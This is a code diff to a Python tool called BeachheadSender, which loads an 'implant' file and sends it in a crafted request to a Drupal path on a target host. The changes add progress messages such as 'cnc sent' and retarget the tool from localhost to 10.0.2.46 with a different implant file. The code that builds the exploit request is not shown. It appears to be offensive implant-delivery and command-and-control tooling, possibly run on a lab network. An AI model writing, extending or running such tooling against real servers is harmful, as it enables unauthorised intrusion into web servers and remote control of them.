@@ -8,8 +8,9 @@ class BeachheadSender:
 
     def __init__(self, ip_addr: str, port: str, drupal_path: str, implant_file_path: str):
         self.implant = self.load_implant(PARENT_DIR + implant_file_path)
+        print("BEACHHEAD SENDER: implant created")
         self.request = self.create_request(ip_addr, port, drupal_path)
-        pass
+        print("BEACHHEAD SENDER: request created")
 
     def load_implant(self, implant_file_path: str):
         with open(implant_file_path, 'r') as f:
@@ -51,12 +52,13 @@ class BeachheadSender:
         try:
             prepped = s.prepare_request(self.request)
             s.send(prepped, verify=False, timeout=1)
+            print("BEACHHEAD SENDER: cnc sent")
         except requests.exceptions.ConnectionError as e:
             print(e)
 
 
 if __name__ == "__main__":
-    sender = BeachheadSender(ip_addr='127.0.0.1', port='8081',
-                             drupal_path='/drupal', implant_file_path='include/BeachheadReceiver.py')
+    sender = BeachheadSender(ip_addr='10.0.2.46', port='8081',
+                             drupal_path='/drupal', implant_file_path='test/cnc_test3.py')
     # print(sender.implant)
     sender.send_request()
